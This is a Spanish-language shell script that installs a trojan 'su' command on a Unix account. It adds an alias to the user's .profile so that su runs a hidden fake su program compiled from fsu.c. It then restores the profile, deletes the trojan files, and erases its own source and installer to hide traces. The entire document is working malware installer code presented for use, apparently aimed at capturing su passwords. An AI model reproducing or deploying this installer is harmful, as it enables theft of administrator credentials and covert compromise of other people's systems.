#!/bin/sh
# tsu_inst - Instalador del su troyano
# Requerimientos: Codigo fuente del troyano fsu.c, o su version compilada
#                 Acceso a compilador
# Uso: ./tsu_inst.sh
#
# Autor: T. Nahual (Raza-Mexicana)
#

# Destruir este script y el codigo fuente fsu.c despues de instalacion?
# A menos que se esten haciendo pruebas, dejar su valor en 1
#
DESTRUIR=1

# Directorio personal
#
DIR=$HOME

# Nombre del shell script principal
#
SUSCR=$DIR/.su

# Nombre del programa troyano
#
FSU=$DIR/.fsu

# Definir el script de inicializacion
# Es posible cambiarlo a .bashrc, etc, si es necesario.
#
INIT=$DIR/.profile

# Archivo de respaldo
#
INITBAK=$DIR/.init.bak

# Codigo fuente de fsu
#
FSUSRC=$PWD/fsu.c

# Analizador de texto
#
GREP=fgrep

# Compilador
#
CC=gcc


# ---- No debe haber necesidad de modificar lo demas ----


# Verificar, y crear si es necesario, los archivo de inicializacion login y rc
#
if [ ! -e $INIT ]; then
    echo "" > $INIT
fi


# Asegurarse de que no este instalado el troyano ya
# (Algo poco posible, a menos que la coca y aspirinas ya no esten
# haciendo efecto!)
#

$GREP "alias su=\"source $SUSCR\"" $INIT | cut -f3 -d" " | cut -f1 -d\" > vrf_inst.tmp
read VRFINST < vrf_inst.tmp

rm vrf_inst.tmp

if [ ! -z $VRFINST ]; then
	echo "El programa ya esta instalado, vete a dormir"
	exit 0

fi

# Hacer una copia de respaldo del script de inicializacion
#
cp $INIT $INITBAK


# A~adir el alias apropiado al archivo de inicializacion
#
echo -e "\nalias su=\"source $SUSCR\"" >> $INIT


# Generar script activador del troyano
# Limpia cualquier rastro despues de ser activado
#
echo "#!/bin/sh
unalias su
$FSU
mv $INITBAK $INIT
rm $FSU
rm $SUSCR
" > $DIR/.su


# Compilar falso 'su'.
# Si existe ya, sera reemplazado.
#
if [ ! -e $FSUSRC ]; then
    echo "Advertencia: El codigo fuente $FSUSRC no existe."

    if [ -e $FSU ]; then
	echo "Advertencia: $FSU parece existir ya, no sera compilado"
	echo "Instalacion completada."

	if [ $(($DESTRUIR==0)) = 1 ]; then
	    echo "Acordarse de borrar $0!"
	fi

	exit 0

    else
	echo "Error: No se encontro $FSU"
	echo "Instalacion abortada."
	cp $INITBAK $INIT
	rm $INITBAK
	exit 1

    fi

    exit 1

else
    $CC -o $FSU $FSUSRC
    echo "Instalacion completada"

fi


if [ $(($DESTRUIR==0)) = 1 ]; then
    echo "Acordarse de borrar $0 y $FSUSRC !"
    exit 0
fi


# Borrar codigo fuente del troyano
rm $FSUSRC

# Borrar script de instalacion
rm $0

exit 0

# FIN
